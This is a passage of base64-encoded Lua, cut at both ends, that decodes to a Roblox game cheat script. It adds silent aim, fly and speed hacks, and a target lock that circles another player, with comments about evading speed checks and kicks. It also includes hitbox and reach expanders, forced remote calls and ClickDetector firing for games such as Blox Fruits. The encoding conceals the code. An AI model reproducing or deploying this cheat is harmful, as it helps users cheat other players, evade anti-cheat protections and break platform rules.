HlEZXNjcmlwdGlvbkN1c3RvbShodW1hbm9pZCwgZGVzYykgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBVUERBVEUgRk9WIENJUkNMRSAoVklTVUFMUykKICAgICAgICBpZiBDb25maWcuU2lsZW50QWltIGFuZCBDb25maWcuU2hvd0ZPViB0aGVuCiAgICAgICAgICAgIEZPVkNpcmNsZS5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICBGT1ZDaXJjbGUuUmFkaXVzID0gQ29uZmlnLlNpbGVudEZPVgogICAgICAgICAgICBGT1ZDaXJjbGUuUG9zaXRpb24gPSBVc2VySW5wdXRTZXJ2aWNlOkdldE1vdXNlTG9jYXRpb24oKQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gVmlzdWFsIGZlZWRiYWNrIGlmIHRhcmdldCBpcyBpbiByYW5nZQogICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBnZXRDbG9zZXN0UGxheWVyVG9Nb3VzZShDb25maWcuU2lsZW50Rk9WLCB0cnVlKQogICAgICAgICAgICBpZiB0YXJnZXQgdGhlbgogICAgICAgICAgICAgICAgRk9WQ2lyY2xlLkNvbG9yID0gQ3VycmVudFRoZW1lQ29sb3IgLS0gVGhlbWUgQ29sb3IgKFRhcmdldCBGb3VuZCkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgRk9WQ2lyY2xlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkgLS0gV2hpdGUgKFVubG9ja2VkKQogICAgICAgICAgICBlbmQKICAgICAgICBlbHNlCiAgICAgICAgICAgIEZPVkNpcmNsZS5WaXNpYmxlID0gZmFsc2UKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBTVEFOREFSRCBGTFkgKEZJWEVEOiBOTyBBTkNIT1IsIFVTRSBCT0RZVkVMT0NJVFkpCiAgICAgICAgaWYgQ29uZmlnLlN0YW5kYXJkRmx5IGFuZCBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgbG9jYWwgYnYgPSByb290UGFydDpGaW5kRmlyc3RDaGlsZCgiRmx5VmVsb2NpdHkiKQogICAgICAgICAgICBpZiBub3QgYnYgdGhlbgogICAgICAgICAgICAgICAgYnYgPSBJbnN0YW5jZS5uZXcoIkJvZHlWZWxvY2l0eSIpCiAgICAgICAgICAgICAgICBidi5OYW1lID0gIkZseVZlbG9jaXR5IgogICAgICAgICAgICAgICAgYnYuTWF4Rm9yY2UgPSBWZWN0b3IzLm5ldyhtYXRoLmh1Z2UsIG1hdGguaHVnZSwgbWF0aC5odWdlKQogICAgICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgIGJ2LlBhcmVudCA9IHJvb3RQYXJ0CiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgYmcgPSByb290UGFydDpGaW5kRmlyc3RDaGlsZCgiRmx5R3lybyIpCiAgICAgICAgICAgIGlmIG5vdCBiZyB0aGVuCiAgICAgICAgICAgICAgICBiZyA9IEluc3RhbmNlLm5ldygiQm9keUd5cm8iKQogICAgICAgICAgICAgICAgYmcuTmFtZSA9ICJGbHlHeXJvIgogICAgICAgICAgICAgICAgYmcuUCA9IDllNAogICAgICAgICAgICAgICAgYmcubWF4VG9ycXVlID0gVmVjdG9yMy5uZXcoOWU5LCA5ZTksIDllOSkKICAgICAgICAgICAgICAgIGJnLmNmcmFtZSA9IHJvb3RQYXJ0LkNGcmFtZQogICAgICAgICAgICAgICAgYmcuUGFyZW50ID0gcm9vdFBhcnQKICAgICAgICAgICAgZW5kCgogICAgICAgICAgICBsb2NhbCBjYW1DRiA9IGNhbWVyYS5DRnJhbWUKICAgICAgICAgICAgbG9jYWwgbW92ZURpciA9IFZlY3RvcjMubmV3KDAsIDAsIDApCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBVc2VySW5wdXRTZXJ2aWNlOklzS2V5RG93bihFbnVtLktleUNvZGUuVykgdGhlbiBtb3ZlRGlyID0gbW92ZURpciArIGNhbUNGLkxvb2tWZWN0b3IgZW5kCiAgICAgICAgICAgIGlmIFVzZXJJbnB1dFNlcnZpY2U6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5TKSB0aGVuIG1vdmVEaXIgPSBtb3ZlRGlyIC0gY2FtQ0YuTG9va1ZlY3RvciBlbmQKICAgICAgICAgICAgaWYgVXNlcklucHV0U2VydmljZTpJc0tleURvd24oRW51bS5LZXlDb2RlLkEpIHRoZW4gbW92ZURpciA9IG1vdmVEaXIgLSBjYW1DRi5SaWdodFZlY3RvciBlbmQKICAgICAgICAgICAgaWYgVXNlcklucHV0U2VydmljZTpJc0tleURvd24oRW51bS5LZXlDb2RlLkQpIHRoZW4gbW92ZURpciA9IG1vdmVEaXIgKyBjYW1DRi5SaWdodFZlY3RvciBlbmQKICAgICAgICAgICAgaWYgVXNlcklucHV0U2VydmljZTpJc0tleURvd24oRW51bS5LZXlDb2RlLlNwYWNlKSB0aGVuIG1vdmVEaXIgPSBtb3ZlRGlyICsgVmVjdG9yMy5uZXcoMCwgMSwgMCkgZW5kCiAgICAgICAgICAgIGlmIFVzZXJJbnB1dFNlcnZpY2U6SXNLZXlEb3duKEVudW0uS2V5Q29kZS5MZWZ0Q29udHJvbCkgdGhlbiBtb3ZlRGlyID0gbW92ZURpciAtIFZlY3RvcjMubmV3KDAsIDEsIDApIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgYmcuQ0ZyYW1lID0gY2FtQ0YKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIEFsd2F5cyB1cGRhdGUgdmVsb2NpdHkgYmFzZWQgb24gY3VycmVudCBGbHlTcGVlZFZhbHVlIChldmVuIHdoZW4gbm90IG1vdmluZykKICAgICAgICAgICAgLS0gVGhpcyBlbnN1cmVzIHNwZWVkIGNoYW5nZXMgdGFrZSBlZmZlY3QgaW1tZWRpYXRlbHkKICAgICAgICAgICAgaWYgbW92ZURpci5NYWduaXR1ZGUgPiAwIHRoZW4KICAgICAgICAgICAgICAgIGJ2LlZlbG9jaXR5ID0gbW92ZURpci5Vbml0ICogKENvbmZpZy5GbHlTcGVlZFZhbHVlICogNCkKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLCAwLCAwKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIGh1bWFub2lkIHRoZW4gCiAgICAgICAgICAgICAgICBodW1hbm9pZC5QbGF0Zm9ybVN0YW5kID0gdHJ1ZSAKICAgICAgICAgICAgICAgIGh1bWFub2lkOkNoYW5nZVN0YXRlKEVudW0uSHVtYW5vaWRTdGF0ZVR5cGUuUnVubmluZ05vUGh5c2ljcykKICAgICAgICAgICAgZW5kCiAgICAgICAgZWxzZQogICAgICAgICAgICAtLSBDbGVhbnVwCiAgICAgICAgICAgIGlmIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGJ2ID0gcm9vdFBhcnQ6RmluZEZpcnN0Q2hpbGQoIkZseVZlbG9jaXR5IikKICAgICAgICAgICAgICAgIGlmIGJ2IHRoZW4gYnY6RGVzdHJveSgpIGVuZAogICAgICAgICAgICAgICAgbG9jYWwgYmcgPSByb290UGFydDpGaW5kRmlyc3RDaGlsZCgiRmx5R3lybyIpCiAgICAgICAgICAgICAgICBpZiBiZyB0aGVuIGJnOkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgaWYgQ29uZmlnLlNwZWVkSGFjayBhbmQgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICBodW1hbm9pZC5XYWxrU3BlZWQgPSBDb25maWcuV2Fsa1NwZWVkVmFsdWUKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICBpZiBDb25maWcuRWFzeUxvY2sgYW5kIENvbmZpZy5UYXJnZXROYW1lIH49ICJOb25lIiBhbmQgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuCiAgICAgICAgICAgIGxvY2FsIHRhcmdldFBsciA9IFBsYXllcnM6RmluZEZpcnN0Q2hpbGQoQ29uZmlnLlRhcmdldE5hbWUpCiAgICAgICAgICAgIGlmIHRhcmdldFBsciBhbmQgdGFyZ2V0UGxyLkNoYXJhY3RlciBhbmQgdGFyZ2V0UGxyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldFJvb3QgPSB0YXJnZXRQbHIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gSW1wcm92ZWQgIlVudG91Y2hhYmxlIiBTdHJhZmluZyBMb2dpYyAoR29kIE1vZGUgTW92ZW1lbnQpCiAgICAgICAgICAgICAgICBsb2NhbCB0ID0gdGljaygpCiAgICAgICAgICAgICAgICBsb2NhbCBiYXNlUmFkaXVzID0gQ29uZmlnLkZvbGxvd0Rpc3RhbmNlCiAgICAgICAgICAgICAgICBpZiBiYXNlUmFkaXVzIDwgMTAgdGhlbiBiYXNlUmFkaXVzID0gMjAgZW5kIC0tIEluY3JlYXNlZCByYWRpdXMgZm9yIGJldHRlciBkb2RnaW5nCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIE9wdGltaXplZCBtb3ZlbWVudCB0byByZWR1Y2UgUGluZy9MYWcKICAgICAgICAgICAgICAgIGxvY2FsIHJhZGl1cyA9IGJhc2VSYWRpdXMgKyBtYXRoLnNpbih0ICogMikgKiA0IAogICAgICAgICAgICAgICAgbG9jYWwgYW5nbGUgPSB0ICogNC41IAogICAgICAgICAgICAgICAgbG9jYWwgaGVpZ2h0ID0gbWF0aC5zaW4odCAqIDIuNSkgKiA0IAogICAgICAgICAgICAgICAgLS0gT3B0aW1pemVkIG1vdmVtZW50IHRvIHJlZHVjZSBQaW5nL0xhZyAmIEFudGktS2ljawogICAgICAgICAgICAgICAgbG9jYWwgcmFkaXVzID0gYmFzZVJhZGl1cyAtLSBGaXhlZCByYWRpdXMgdG8gcHJldmVudCBydWJiZXJiYW5kaW5nCiAgICAgICAgICAgICAgICBsb2NhbCBhbmdsZSA9IHQgKiAyLjIgLS0gU2xvd2VyIHJvdGF0aW9uIHRvIGF2b2lkIHNwZWVkIGNoZWNrcwogICAgICAgICAgICAgICAgbG9jYWwgaGVpZ2h0ID0gbWF0aC5zaW4odCAqIDEuNSkgKiAzIC0tIFNtb290aGVyIHZlcnRpY2FsIG9zY2lsbGF0aW9uCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIG9mZnNldCA9IFZlY3RvcjMubmV3KG1hdGguY29zKGFuZ2xlKSAqIHJhZGl1cywgaGVpZ2h0LCBtYXRoLnNpbihhbmdsZSkgKiByYWRpdXMpCiAgICAgICAgICAgICAgICBsb2NhbCBuZXdQb3MgPSB0YXJnZXRSb290LlBvc2l0aW9uICsgb2Zmc2V0CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcobmV3UG9zLCB0YXJnZXRSb290LlBvc2l0aW9uKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICByb290UGFydC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwwLDApCiAgICAgICAgICAgICAgICByb290UGFydC5Bc3NlbWJseUFuZ3VsYXJWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICAgICAgcm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkgLS0gTGVnYWN5IHZlbG9jaXR5IHJlc2V0CiAgICAgICAgICAgICAgICBsb2NhbCBidiA9IHJvb3RQYXJ0OkZpbmRGaXJzdENoaWxkKCJGbHlWZWxvY2l0eSIpCiAgICAgICAgICAgICAgICBpZiBub3QgYnYgdGhlbgogICAgICAgICAgICAgICAgICAgIGJ2ID0gSW5zdGFuY2UubmV3KCJCb2R5VmVsb2NpdHkiKQogICAgICAgICAgICAgICAgICAgIGJ2Lk5hbWUgPSAiRmx5VmVsb2NpdHkiCiAgICAgICAgICAgICAgICAgICAgYnYuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgICAgICBidi5NYXhGb3JjZSA9IFZlY3RvcjMubmV3KG1hdGguaHVnZSwgbWF0aC5odWdlLCBtYXRoLmh1Z2UpCiAgICAgICAgICAgICAgICAgICAgYnYuUGFyZW50ID0gcm9vdFBhcnQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBDb25maWcuRWFzeUxvY2sgPSBmYWxzZQogICAgICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siRWFzeUxvY2siXSB0aGVuIFRvZ2dsZUJ1dHRvbnNbIkVhc3lMb2NrIl0uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApIGVuZAogICAgICAgICAgICAgICAgQ29uZmlnLlRhcmdldE5hbWUgPSAiTm9uZSIKICAgICAgICAgICAgICAgIFRhcmdldExhYmVsLlRleHQgPSAiU3RhdHVzOiBUYXJnZXQgTG9zdCIKICAgICAgICAgICAgICAgIFRhcmdldExhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCkKICAgICAgICAgICAgICAgIGxvY2FsIGJ2ID0gcm9vdFBhcnQ6RmluZEZpcnN0Q2hpbGQoIkZseVZlbG9jaXR5IikKICAgICAgICAgICAgICAgIGlmIGJ2IHRoZW4gYnY6RGVzdHJveSgpIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICAKICAgICAgICAtLSBBVVRPIFJBQ0UgVjMgJiBWNAogICAgICAgIGlmIENvbmZpZy5BdXRvVjMgdGhlbgogICAgICAgICAgICBpZiB0aWNrKCkgJSAxIDwgMC4xIHRoZW4gLS0gU3BhbSBUIGV2ZXJ5IHNlY29uZCBhcHByb3gKICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZEtleUV2ZW50KHRydWUsIEVudW0uS2V5Q29kZS5ULCBmYWxzZSwgZ2FtZSkKICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICAgICAgVmlydHVhbElucHV0TWFuYWdlcjpTZW5kS2V5RXZlbnQoZmFsc2UsIEVudW0uS2V5Q29kZS5ULCBmYWxzZSwgZ2FtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQpKQoKICAgIC0tIEFVVE8gQVdBS0VOSU5HIExPT1AKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLkF1dG9Bd2FrZW5pbmcgdGhlbgogICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGJhY2twYWNrID0gcGxheWVyOkZpbmRGaXJzdENoaWxkKCJCYWNrcGFjayIpCiAgICAgICAgICAgICAgICAgICAgaWYgYmFja3BhY2sgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBhd2FrZW5pbmcgPSBiYWNrcGFjazpGaW5kRmlyc3RDaGlsZCgiQXdha2VuaW5nIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgYXdha2VuaW5nIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJlbW90ZUZ1bmMgPSBhd2FrZW5pbmc6RmluZEZpcnN0Q2hpbGQoIlJlbW90ZUZ1bmN0aW9uIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHJlbW90ZUZ1bmMgdGhlbiByZW1vdGVGdW5jOkludm9rZVNlcnZlcih0cnVlKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIC0tIERBU0ggTEVOR1RIIExPT1AKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLkRhc2hMZW5ndGhFbmFibGVkIGFuZCBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgdmFsID0gQ29uZmlnLkRhc2hMZW5ndGhWYWx1ZQogICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyOkdldEF0dHJpYnV0ZSgiRGFzaExlbmd0aCIpIH49IHZhbCB0aGVuCiAgICAgICAgICAgICAgICAgICAgY2hhcmFjdGVyOlNldEF0dHJpYnV0ZSgiRGFzaExlbmd0aCIsIHZhbCkKICAgICAgICAgICAgICAgICAgICBjaGFyYWN0ZXI6U2V0QXR0cmlidXRlKCJEYXNoTGVuZ3RoQWlyIiwgdmFsKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGVuZAogICAgZW5kKQoKICAgIC0tIEhBTkRMRSBFWFRFTkRFUiBMT09QCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICB3aGlsZSBDb25maWcuSXNSdW5uaW5nIGRvCiAgICAgICAgICAgIGlmIENvbmZpZy5IYW5kbGVFeHRlbmRl" .. "ciB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikKICAgICAgICAgICAgICAgICAgICBpZiB0b29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHBhcnQgaW4gcGFpcnModG9vbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGFydDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBwYXJ0OkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0OlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIiwgcGFydC5TaXplKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuU2l6ZSA9IHBhcnQ6R2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiKSAqIENvbmZpZy5IYW5kbGVTaXplCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5NYXNzbGVzcyA9IHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIGFybVBhcnRzID0geyJMZWZ0IEFybSIsICJSaWdodCBBcm0iLCAiTGVmdCBMZWciLCAiUmlnaHQgTGVnIiwgIkxlZnRIYW5kIiwgIlJpZ2h0SGFuZCIsICJMZWZ0TG93ZXJBcm0iLCAiTGVmdFVwcGVyQXJtIiwgIlJpZ2h0TG93ZXJBcm0iLCAiUmlnaHRVcHBlckFybSIsICJMZWZ0TG93ZXJMZWciLCAiTGVmdFVwcGVyTGVnIiwgIkxlZnRGb290IiwgIlJpZ2h0TG93ZXJMZWciLCAiUmlnaHRVcHBlckxlZyIsICJSaWdodEZvb3QifQogICAgICAgICAgICAgICAgICAgIGZvciBfLCBuYW1lIGluIHBhaXJzKGFybVBhcnRzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBwYXJ0ID0gY2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKG5hbWUpCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBhcnQgYW5kIHBhcnQ6SXNBKCJCYXNlUGFydCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBwYXJ0OkdldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIikgdGhlbiBwYXJ0OlNldEF0dHJpYnV0ZSgiT3JpZ2luYWxTaXplIiwgcGFydC5TaXplKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhcnQuU2l6ZSA9IHBhcnQ6R2V0QXR0cmlidXRlKCJPcmlnaW5hbFNpemUiKSAqIENvbmZpZy5IYW5kbGVTaXplCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXJ0Lk1hc3NsZXNzID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFydC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgZW5kCiAgICBlbmQpCgogICAgLS0gSW5wdXRzCiAgICB0YWJsZS5pbnNlcnQoQ29ubmVjdGlvbnMsIFVzZXJJbnB1dFNlcnZpY2UuSW5wdXRCZWdhbjpDb25uZWN0KGZ1bmN0aW9uKGlucHV0LCBncCkKICAgICAgICBpZiBncCBhbmQgbm90IChpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5LZXlib2FyZCBhbmQgaW5wdXQuS2V5Q29kZSA9PSBFbnVtLktleUNvZGUuUiBhbmQgQ29uZmlnLkFpckZsYXNoU3RlcCkgdGhlbiByZXR1cm4gZW5kCgogICAgICAgIC0tIEFpciBGbGFzaFN0ZXA6IHNwYXduIGludmlzaWJsZSBwYXJ0IGF0IG1vdXNlIHdvcmxkIHBvc2l0aW9uIChjbGFtcGVkIGJ5IHJhbmdlKQogICAgICAgIGlmIGlucHV0LktleUNvZGUgPT0gRW51bS5LZXlDb2RlLlIgYW5kIENvbmZpZy5BaXJGbGFzaFN0ZXAgdGhlbgogICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIG1heERpc3QgPSBDb25maWcuQWlyRmxhc2hTdGVwUmFuZ2Ugb3IgMjAwCiAgICAgICAgICAgICAgICBsb2NhbCBtb3VzZUhpdCA9IG1vdXNlLkhpdC5Qb3NpdGlvbgogICAgICAgICAgICAgICAgbG9jYWwgZGlyZWN0aW9uID0gKG1vdXNlSGl0IC0gcm9vdFBhcnQuUG9zaXRpb24pLlVuaXQKICAgICAgICAgICAgICAgIGxvY2FsIGRpc3RhbmNlID0gKG1vdXNlSGl0IC0gcm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UG9zID0gbW91c2VIaXQKICAgICAgICAgICAgICAgIGlmIGRpc3RhbmNlID4gbWF4RGlzdCB0aGVuIHRhcmdldFBvcyA9IHJvb3RQYXJ0LlBvc2l0aW9uICsgZGlyZWN0aW9uICogbWF4RGlzdCBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbG9jYWwgcCA9IEluc3RhbmNlLm5ldygiUGFydCIpCiAgICAgICAgICAgICAgICBwLkFuY2hvcmVkID0gdHJ1ZQogICAgICAgICAgICAgICAgcC5DYW5Db2xsaWRlID0gZmFsc2UKICAgICAgICAgICAgICAgIHAuU2hhcGUgPSBFbnVtLlBhcnRUeXBlLkJhbGwKICAgICAgICAgICAgICAgIHAuU2l6ZSA9IFZlY3RvcjMubmV3KDQsIDQsIDQpCiAgICAgICAgICAgICAgICBwLkNGcmFtZSA9IENGcmFtZS5uZXcodGFyZ2V0UG9zICsgVmVjdG9yMy5uZXcoMCwgMSwgMCkpCiAgICAgICAgICAgICAgICBwLlRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgICAgIHAuTWF0ZXJpYWwgPSBFbnVtLk1hdGVyaWFsLk5lb24KICAgICAgICAgICAgICAgIHAuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMCkKICAgICAgICAgICAgICAgIHAuTmFtZSA9ICJBaXJGbGFzaFN0ZXBQYXJ0IgogICAgICAgICAgICAgICAgcC5QYXJlbnQgPSB3b3Jrc3BhY2UKICAgICAgICAgICAgICAgIHRhc2suZGVsYXkoMSwgZnVuY3Rpb24oKSBpZiBwIHRoZW4gcDpEZXN0cm95KCkgZW5kIGVuZCkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCgogICAgICAgIGlmIGlucHV0LlVzZXJJbnB1dFR5cGUgPT0gRW51bS5Vc2VySW5wdXRUeXBlLk1vdXNlQnV0dG9uMSBhbmQgKENvbmZpZy5SZWFjaCBvciBDb25maWcuSGl0Ym94RXhwYW5kZXIpIHRoZW4KICAgICAgICAgICAgQXR0YWNrRnVuY3Rpb24oKSAtLSBGb3JjZSBzZXJ2ZXIgcmVnaXN0cmF0aW9uIG9uIG1hbnVhbCBjbGljawogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIC0tIElOVEVSQUNUIFdJVEggTiAoQmxveCBGcnVpdHMgRml4IGZvciBDbGlja0RldGVjdG9ycykKICAgICAgICBpZiBDb25maWcuSGl0Ym94UHJlc2V0IGFuZCBpbnB1dC5LZXlDb2RlID09IEVudW0uS2V5Q29kZS5OIHRoZW4KICAgICAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHJvb3QgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgaWYgcm9vdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2xvc2VzdE9iaiA9IG5pbAogICAgICAgICAgICAgICAgICAgIGxvY2FsIG1pbkRzdCA9IDE1CiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMoV29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJDbGlja0RldGVjdG9yIikgYW5kIHYuUGFyZW50IGFuZCB2LlBhcmVudDpJc0EoIkJhc2VQYXJ0IikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgZHN0ID0gKHYuUGFyZW50LlBvc2l0aW9uIC0gcm9vdC5Qb3NpdGlvbikuTWFnbml0dWRlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkc3QgPCBtaW5Ec3QgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1pbkRzdCA9IGRzdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsb3Nlc3RPYmogPSB2CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgaWYgY2xvc2VzdE9iaiBhbmQgZmlyZWNsaWNrZGV0ZWN0b3IgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBmaXJlY2xpY2tkZXRlY3RvcihjbG9zZXN0T2JqKQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGlmIGlucHV0LktleUNvZGUgPT0gQ29uZmlnLkhpZGVHdWlLZXkgdGhlbgogICAgICAgICAgICBpc0d1aVZpc2libGUgPSBub3QgaXNHdWlWaXNpYmxlCiAgICAgICAgICAgIGlmIGlzTWluaW1pemVkIHRoZW4KICAgICAgICAgICAgICAgIGlmIE1pbmltaXplZEd1aSB0aGVuIE1pbmltaXplZEd1aS5FbmFibGVkID0gaXNHdWlWaXNpYmxlIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBNYWluRnJhbWUuVmlzaWJsZSA9IGlzR3VpVmlzaWJsZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIF9HLlNub3dHdWkgdGhlbgogICAgICAgICAgICAgICAgaWYgQ29uZmlnLkRpc2FibGVTbm93IHRoZW4KICAgICAgICAgICAgICAgICAgICBfR